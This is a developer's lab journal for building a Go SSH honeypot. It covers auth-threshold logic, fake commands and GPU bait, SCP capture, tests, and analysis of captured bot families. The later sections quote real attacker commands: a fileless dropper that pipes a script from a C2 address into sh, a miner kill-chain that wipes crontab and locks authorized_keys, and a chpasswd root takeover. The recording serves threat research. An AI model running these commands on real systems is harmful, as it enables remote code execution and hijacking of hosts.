# NOTES.md
Lab Journal Decision Reasons

### Phase 1

**Picked / rejected:**

- Root packages no `cmd/` simple
- `slog` JSON logs for analysis
- `x/crypto/ssh` only real option
- `flag` stdlib enough
- Module path standard

### Phase 2 Iteration 1

**Picked / rejected:**

- Walking skeleton fast feedback
- Minimal packages from start
- Config `Addr` only
- Logger `io.Writer` clean
- Ephemeral ed25519 key
- Reject all auth first
- Basic auth log fields
- `server.Options` struct

**Skipped:**

- Tests
- File logs
- Graceful shutdown

**Notes:**

- Learned closures logging
- SSH errors show all attempts

### Phase 2 Iteration 2

**Picked / rejected:**

- Accept all auth
- Log before return
- Only session channels
- Goroutine per channel
- Parse request structs

**Skipped:**

- No shell
- No tests

**Notes:**

- Must drain reqs
- `ssh.Unmarshal` ok

### Phase 2 Iteration 3

**Picked / rejected:**

- Byte loop raw input
- Manual echo CRLF
- Simple buffer
- Flat command map temp
- Fake system fixed

**Skipped:**

- No dynamic cmds
- No args
- No tests

**Notes:**

- CRLF bug
- Slice logic clicked

### Phase 2 Iteration 4

**Picked / rejected:**

- `Cmd` interface
- Registry map
- Args handled inside
- Grouped files
- `sudo` fake root
- Real exit codes

**Skipped:**

- No cwd
- No capture
- No tests

**Notes:**

- Building attacker UX

### Phase 3 Iteration 1

**Picked / rejected:**

- 3 log files
- Append mode
- `log dir` flag

**Skipped:**

- No rotation
- No correlation

**Notes:**

- Cleanup on error
- `slog = writer`

### Phase 3 Iteration 2

**Picked:**

- Persistent ed25519 key

**Why:**

- Scanners fingerprint
- Restart key change is a tell

**Tradeoff:**

- Key theft low risk

**Skipped:**

- No rotation
- Reading

### Phase 1 (Summary)

- Honeypot levels
- SSH auth
- `crypto/rand`
- Key strategy

### Phase 2 (Summary)

- Channels risks
- Wire format
- Fingerprint

### Phase 3 (Summary)

- Terminal modes
- Fake system consistency
- Attack scripts flow

---

### Pre-deploy session

**Picked / rejected:**

- Multi-password per connection: reject first 3, accept on 4th
- `sync.Mutex` + `map[string]int` keyed by `c.SessionID()` for per-connection counts
- `Handle` returns `string` (session ID) so the goroutine can clean up the map after disconnect
- `MaxAuthTries: 6` set explicitly so library doesn't cut off clients before the 4th attempt
- `go mod tidy` -- x/crypto was marked `// indirect`, fixed to direct
- Public key auth: not logged at all, no `PublicKeyCallback` set -- silent drop

**Skipped:**

- `PublicKeyCallback` -- bots rarely use pubkey, adding later
- `AuthLogCallback` -- would catch all methods but less detail per attempt

**Notes:**

- Multiple `ssh.Password()` entries in the client config do NOT retry -- SSH client
  marks the "password" method exhausted after the first server rejection. Need
  `RetryableAuthMethod` + `PasswordCallback` with a cycling closure to test N attempts.
- `net.Pipe()` deadlocks for SSH tests: both sides write the version string before
  reading, synchronous pipe means neither can proceed. Use real TCP (`net.Listen` on :0).
- Unit-testing the callback directly with a fake `ssh.ConnMetadata` is cleaner than
  going through a full handshake for the counter logic.
- Bots that only try 1-2 passwords per connection now get rejected and reconnect.
  The `"attempt"` field in auth.log lets you correlate sessions from the same IP.

**Tests added:**

- `hostkey`: LoadOrGenerate creates file, reloads same key
- `logger`: files created, Close no error, writes land on disk
- `session/cmd_test.go`: table-driven for 24 commands + 8 individual edge cases
- `server`: 2 unit tests (callback counter, session isolation) + 1 integration test

---

### Post-deploy bug fix

**The bug:**

Deployed the honeypot, 329 auth attempts in 4h, only 2 got a shell -- both from a
human tester. Every real bot was rejected on every attempt.

Root cause: the attempts map was keyed by `c.RemoteAddr().String()` which returns
`IP:port`. Bots open a fresh TCP connection per password guess, each connection uses
a different ephemeral source port, so the counter key changed every time and n was
always 1. Nobody ever reached the threshold.

Second bug found during fix: the goroutine cleanup ran `delete(attempts, host)` after
every connection close, which wiped the counter even when using IP-only keys. Had to
change it to only delete when `attempts[host] >= 10` -- otherwise counter still resets.

**Fixed:**

- Key by IP only: `net.SplitHostPort` strips the port
- Cleanup only on accept: `if attempts[host] >= 10 { delete }`
- Threshold bumped 2 -> 10: harvest more passwords before letting bot through
- `MaxAuthTries` bumped 6 -> 20 to match

**Tests added to catch regressions:**

- `TestCallbackAccumulatesAcrossConnections`: same IP, 10 different ports, n must go 1..10
- `TestCallbackResetsOnlyAfterAccept`: cleanup must not wipe counter on rejected connections
- `TestIntegrationThresholdAcrossConnections`: real `Serve()`, 10 sequential TCP connections,
  connection 10 accepted -- this is the test that caught the cleanup bug live

**Verified on VPS:** attempts 1-9 rejected, attempt 10 accepted, attempt 11 rejected (reset).

---

### First findings + bait + scp receive

**What we saw in the logs (first ~6h, Helsinki VPS):**

541 auth attempts from 10 IPs. Almost all `SSH-2.0-Go` banners -- mass scanners
written in Go, credential stuffing with dumb passwords (123456, 1, 123).

Two distinct bot types once they got a shell:

1. **Crypto miner recon** -- ran `uname -s -v -n -r -m`, `nproc`, `lspci | grep 3D`,
   `uname -m`. Checking OS + CPU count + GPU. The `lspci | grep 3D` is the GPU check,
   that's what tells it whether to deploy a miner. Ran the same script 11 times.

2. **Dropper bot** -- `mkdir /lib/<random10chars>` then `scp -t -r /lib/<random10chars>/`
   repeated 10 times with different directory names. `scp -t` is server-side SCP receive --
   the bot was trying to upload a payload from its own machine. We returned exit 1 so all
   10 attempts failed.

**Bait added:**

- `nproc` -> 8 (was "command not found")
- `lspci` -> fake PCI list with `Tesla T4` GPU entry (3D controller line)
- `uname -s -v -n -r -m` -> handled the multi-flag case the bot actually sends
- Miner bot now sees a 8-core GPU machine. Should try harder.

**SCP receive -- option A chosen (exit 0, capture the playbook):**

`scp -t` now speaks the SCP wire protocol server-side: sends `\x00` ready byte,
parses C/D/E headers, drains file data with `io.LimitReader`, acks each step, exits 0.
Bot thinks upload worked -> will proceed to `chmod +x` + execute -> we see that in session.log.

Shell path (bot types `scp -t` in interactive shell): `scpCmd.Run` returns exit 0 when
`-t` flag present. Can't do the wire protocol over the line-buffered shell, but exit 0
is enough to keep the bot moving.

Rejected option B (permission denied) -- would have stopped the bot before we saw its
next step. The point is to capture the full playbook.

**Tests:**

- `isSCPReceive`: 8 cases, flag in various positions
- shell path: `-t` exits 0, no `-t` exits non-zero with "unreachable"
- exec path: single file transfer, recursive dir, empty stream
- `fakeChan` struct implements `ssh.Channel` with in-memory buffers

**Integration test:**

`verify/dropper_sim.go` -- connects to live honeypot, loops until accepted, speaks
full SCP protocol, checks all ack bytes are `\x00`, verifies exit 0.
Verified on VPS_IP:2222 after deploy -- accepted on attempt 6 (counter was
partially accumulated), full exchange completed.

**What to watch for next:**

- `chmod +x` + execute after scp -- means the upload path worked
- `curl`/`wget` with a real C2 URL in session.log -- that's the money finding
- `crontab`, `systemctl` -- persistence phase

---

### I-2: stateful virtual filesystem

**Picked:**

- `Session` struct per connection: `cwd`, `fs map[string][]byte`, `dirs map[string]bool`
- `mkdir`, `touch`, `rm`, `cd`, `pwd` all mutate/read session state
- `ls` checks session FS first, falls back to hardcoded for `/` and home
- `cat` checks session FS first -- uploaded files visible after scp
- `scp` writes received file path into `sess.fs` so `ls /tmp` shows it
- `/bin/echo` added to `fakeFiles` as ELF magic bytes -- closes T2

**Rejected:**

- global FS state -- per-session is cleaner and avoids cross-session leaks
- persistent FS across reconnects -- not worth the complexity

---

### && operator + redirect stripping

**Picked:**

-  `dispatchSegment` holds pipe logic, `dispatch` loops on `&&` segments
- stop on first non-zero exit -- bash `&&` semantics
- `> /dev/null` stripped before dispatch so echo-then-cat chains work
- `egrep` registered as alias for `grep`

**Why:**

- Diicot runs `lspci | egrep VGA && lspci | grep 3D` -- was getting "command not found" on `egrep`, whole command failed, bot never escalated
- ELF checker bots use `echo 1 > /dev/null && cat /bin/echo` -- same `&&` + redirect issue

**Rejected:**

- inlining `&&` split inside `dispatch` without helper -- harder to test

---

### I-4: real pipe execution

**Picked:**

- `dispatch` splits on `|`, feeds each stage stdout into next stage stdin
- `Cmd` interface gains `stdin string` and `sess *Session` params
- `grep` filters stdin lines, joins multi-word patterns (handles shell quoting split by Fields)
- `wc` counts lines/words/bytes in stdin
- `head -c N` slices first N bytes of stdin
- `awk` with `{print $1}` / `{printf $1}` extracts first field; no-arg passes stdin through
- full Diicot recon pipeline now works end-to-end: `nvidia-smi -q | grep "Product Name" | awk | wc -l | head -c 1` -> `1`

**Rejected:**

- semicolon chaining -- not in scope, pipes cover the capture data

---

### I-8 + I-10: analysis scripts

**Picked:**

- `analysis/sessions.py` -- groups events by `sid`, renders per-session Markdown timeline
- `analysis/timeline.py` -- first/last-seen per password and command, flags chpasswd overlap (credential loop)

---

### I-3: missing commands

**Picked:**

- `nvidia-smi` with real Tesla T4 output for bare, `-q`, `-L` -- closes T1
- `killall`, `chattr`, `disown`, `chpasswd` as exit-0 noops -- closes T4
- `awk`, `wc`, `head`, `grep` and others registered -- no pipe support yet so they're stubs
- `fakeBinaries` updated so `which`/`whereis` return real paths

**Rejected:**

- making `awk`/`wc`/`head` do real text processing -- pointless without pipes (I-4)

---

### I-1: payload quarantine

**Picked:**

- `--quarantine-dir` flag, empty = disabled, dir created at startup
- `filepath.Base` on attacker-supplied filename -- path traversal kill
- 50MB cap before saving, drain rest to discard so protocol stays intact
- `<sha256>-<name>.bin` naming -- deduplication is free

**Rejected:**

- hardcoded path next to log-dir -- wanted operator control
- saving to discard on any error -- kept as fallback, not default

---

### analysis tooling session

**report.py:**

- rich terminal report with ANSI colors, `--no-color` for txt output
- hourly heatmap (ASCII bar chart)
- kill-chain phase tagging per command: RECON / STAGE / UPLOAD / EXEC / PERSIST / CLEANUP
- bot family fingerprinting: Diicot = lspci + nproc + scp -t to /lib/ dirs
- session narrative: one sentence per session ("fingerprinted GPU, CPU cores. tried SCP upload 3x.")
- sequential password pattern detection (1 -> 12 -> 123 -> 1234...)
- credential feedback loop: IP keeps trying after first shell accept

**Rejected:**

- merging into sessions.py -- different output format, different audience

**analyze.sh:**

- local-only wrapper, one arg: log dir
- runs all 4 scripts, result-HHMM--DD-MM naming
- `result-*.txt` in .gitignore

**Findings from logs (2026-05-28):**

- 71.227.179.172: 1545 unique passwords, 1382 attempts after first shell accept -- credential feedback loop confirmed in the wild
- 22:00 UTC spike: 1238 attempts in one hour -- coordinated spray window
- SSH-2.0-Go dominates client banners -- scanning ecosystem is almost all Go

---

### full session analysis -- bot families (2026-05-29)

**687 unique commands, 235 sessions, 72h total.**

---

**Diicot GPU miner -- dominant family (~180 sessions, 2026-05-26/27)**

Same recon script every time:
```
uname -s -v -n -r -m
nproc
lspci | egrep VGA && lspci | grep 3D
uname -m
```
Advanced variant adds nvidia-smi pipeline then the kill chain:
```
crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /...
```
Wipes crontab, locks authorized_keys with chattr (competing attackers can't add SSH keys), kills other miners, deploys. Our fake Tesla T4 GPU response triggered the deployment stage. The bait worked.

---

**SCP dropper -- payload uploader (2026-05-26 17:50, one session)**

Tried 11 directories in sequence looking for a writable path:
/lib/, hidden dir, /dev/, /dev/shm/, /var/volatile/, /tmp/, /sys/, /var/lib/, /root/, /etc/, /var/log/
Each: mkdir <random10chars> then scp -t -r <dir>/. Honeypot returned exit 0 on all -- bot thought it succeeded. Nothing uploaded. This is the same family from earlier, now confirmed as systematic directory bruteforce.

---

**Password changer -- persistence bot (2026-05-26 22:xx - 2026-05-27 01:xx)**

Pattern: uname -a -> cat /etc/passwd -> passwd -> echo 'root:STRONGPW' | chpasswd
Passwords seen: i5n#_o$_6qFK!$s and $MWtB6=$e6mK#=E (both strong random).
Goal: lock out other attackers by changing root password. Tries interactive passwd first (fails in our shell), falls back to chpasswd pipe -- designed for real systems. Classic attacker move to claim exclusive access.

---

**C2 dropper -- fileless exec (2026-05-29, new, threshold=1)**

```
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
```
auth_ok beacon (hex = "auth_ok\n") then pipe-to-sh from 14.46.136.77. Fileless -- nothing written to disk. Came via exec channel (invisible to old analysis). Hit 4+ times today from different IPs, same C2 -- botnet spray. Most dangerous pattern seen so far.

---

**VPS assessor -- infrastructure scout (2026-05-29 09:48, one session)**

35 commands: package managers (apt/yum/pacman/zypper), shadow file read, disk I/O benchmark (dd bs=1M count=10), network interfaces, running services, connectivity check. Profiling the machine for deployment suitability. Did not deploy anything -- pure reconnaissance.

---

**Volume breakdown:**
- 2026-05-26: 88 commands -- initial wave, mixed families
- 2026-05-27: 545 commands -- Diicot heavy day
- 2026-05-28: 10 commands -- genuinely quiet, not a script bug
- 2026-05-29: 44 commands so far -- new families, C2 dropper

2026-05-28 quiet period is real. The "command drought" in the analysis was partly the exec blind spot and partly actual silence.

---

### exec channel blind spot + live dropper (2026-05-29)

**Bug found: report.py and periods.py both undercount commands.**

session.log has two msg types with a `command` field:
- `"shell"` -- interactive shell (bot typed commands)
- `"exec"` -- one-shot SSH exec (bot ran `ssh host cmd` without opening a shell)
- `"channel request"` -- logged again in logRequest() before dispatch, so every exec command appears twice

report.py and periods.py only count `msg == "shell"`. This is why period 8 showed "0 commands" and the overall report showed "10 commands" -- it was missing 679 exec-channel commands entirely. Real count on 2026-05-29: 44 unique commands, 92 log entries.

**Root cause in code:** `logRequest()` logs the command as `"channel request"`, then `runExec()` logs it again as `"exec"`. Fix: pick one, or filter in analysis scripts to avoid double-count.

**Fix needed:** report.py and periods.py should count `msg == "exec"` OR `msg == "shell"`, not just shell. Dedup by (sid, command) to avoid double-count from channel request.

---

**Live dropper seen today (2026-05-29, threshold=1):**

```
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

- hex = "auth_ok\n" -- C2 beacon, signals to controller that auth succeeded
- downloads and pipes `14.46.136.77/sh` directly into sh (no file written to disk)
- `-s ssh` tells the script the entry vector
- came in via exec channel (not interactive shell) -- invisible to old analysis
- hit 4+ times today from different IPs, same payload, same C2 -- botnet spray

**VPS assessment bot (sid e1877e76, 2026-05-29 09:48):**

35 commands in one session: package managers (apt/yum/pacman/zypper), shadow file read attempt, disk speed (dd), network config, systemd services, connectivity check (ping 8.8.8.8). Infrastructure scout, picking candidates for mining deployment.

**Why bursty:** periods 5-7 had 0 commands in the analysis because exec-channel commands weren't counted. Real data shows activity was continuous, just invisible. The "command drought" was a lie from a broken script.

---

### auth-threshold flag + analysis period tooling

**Picked:**

- `AuthThreshold int` config flag, default 1 (accept immediately)
- logs `auth_threshold` at startup in server.log -- period anchor for analysis tool
- guard in `Serve()`: clamp to 1 if unset, avoids silent "n >= 0 always true" footgun
- analysis tool will split log periods by reading the "listening" events in server.log

**Why threshold=1 now:**

- data from VPS shows most IPs try exactly once then leave
- threshold=10 was harvesting passwords but missing all post-auth commands from single-shot bots
- keeping the flag so we can flip back to 10 and compare credential spray data vs shell data

**Rejected:**

- hardcoding 1 -- wanted the option to go back without a code change
